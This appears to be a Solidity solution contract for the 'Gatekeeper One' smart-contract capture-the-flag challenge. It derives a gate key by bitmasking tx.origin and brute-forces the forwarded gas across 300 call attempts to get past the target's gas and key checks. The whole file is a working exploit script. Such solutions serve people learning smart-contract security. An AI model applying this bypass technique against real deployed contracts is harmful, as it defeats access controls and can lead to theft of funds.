// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;


contract GatekeeperOneAttack {
 
    function exploit(address _contract) external{
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = _contract.call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}